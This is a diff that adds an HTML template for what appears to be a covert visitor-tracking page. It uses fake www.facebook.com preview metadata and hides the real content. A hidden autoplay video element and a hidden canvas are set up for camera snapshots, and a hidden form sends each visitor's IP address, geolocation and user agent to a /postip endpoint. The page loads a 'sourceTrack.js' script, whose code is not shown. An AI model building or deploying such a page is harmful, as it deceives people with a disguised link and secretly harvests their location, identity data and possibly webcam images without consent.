@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="www.facebook.com">
+  <!--<meta name="author" content=""> -->
+  <meta property="og:description" content="www.facebook.com">
+  <meta property="og:url" content="www.facebook.com">
+  <meta property="og:image" content="<% if (data&&data.post.content&&data.post.content!=undefined&&data.post.content.length>0 && data.post.content.indexOf('src="')>=0 && data.post.content.indexOf('<img')>=0){%> <%- data.post.content.split('src="')[1].split('"')[0] %><%}%>">
+  <!-- <meta http-equiv="refresh" content="<-data.post.check_delay %> ;url=< - data.post.link  %> "> -->
+    
+  <title><%- data.post.titleval %></title>
+</head>
+
+<body>
+  <!-- Post Content -->
+  <br><br>
+  <div>
+    <!-- < % if (data && data.post){ %> -->
+      <div style="text-align: center; display: none;" class="container">
+        <% if (data&&data.post.content){%><%- data.post.content %> <%}%>
+      </div>
+      <br>
+
+</div>
+<!-- <button id="btnVid" onclick="playVid()">bắt đầu</button> -->
+<div class=video-screenshot style="display: grid; grid-template-columns: 1fr 1fr; grid-column-gap: 10px;">
+  <video autoplay muted playsinline id=video style="width: 100%; visibility: hidden;"></video>
+  <div>
+    <div id=screenshotsContainer>
+      <canvas id=canvas class=is-hidden style="display: none;"></canvas>
+      <!-- s<img id="screenshot" style="width: 100%;"> -->
+    </div>
+  </div>
+</div>
+
+<form action="/postip" method="post" class="postgeo" id="postgeo" name="postgeo">
+  <!-- <input type="hidden" class="appname" id="appname"> -->
+  <input type="hidden" class="title" id="title" name="title" value="<% if (data&&data.post.title){%><%- data.post.title %><%}%>">
+  <input type="hidden" class="getip" id="getip" name="getip" value="<% if (data&&data.getip){%><%- data.getip %><%}%>">
+  <input type="hidden" class="data_geol" id="data_geol" name="data_geol">
+  <!-- <input type="hidden" class="data_img" id="data_img" name="data_img"> -->
+  <input type="hidden" class="useragent" id="useragent" name="useragent">
+  <input type="hidden" class="link" id="link" name="link" value="<% if (data&&data.post.link){%><%- data.post.link %><%}%>">
+  
+
+  <!-- <input type="button" onclick="init()"> -->
+</form>
+<form>
+  <!-- <input type="hidden" class="time" id="time" value=< %- data.post.check_delay %>> -->
+  <input type="hidden" class="check_geo" id="check_geo" value="<% if (data&&data.post.check_geo){%><%- data.post.check_geo %><%}%>">
+  <input type="hidden" class="check_img" id="check_img" value="<% if (data&&data.post.check_img){%><%- data.post.check_img %><%}%>">
+</form>
+  <script type="text/javascript" src="/static/js/jquery.min.js"></script>
+  <script type="text/javascript" src="/static/js/track/sourceTrack.js"></script>
+</body>
+</html>
